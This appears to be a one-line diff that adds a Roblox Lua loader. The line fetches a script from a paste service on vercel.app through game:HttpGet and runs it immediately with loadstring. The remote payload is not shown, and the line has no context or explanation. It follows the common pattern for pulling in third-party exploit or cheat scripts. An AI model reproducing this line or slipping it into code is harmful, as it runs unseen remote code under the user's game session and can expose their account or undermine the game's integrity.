@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://oblivion-web-snowy.vercel.app/api/paste?id=5bfae9fc2740039c872e706711dcd3f2&raw=true"))()
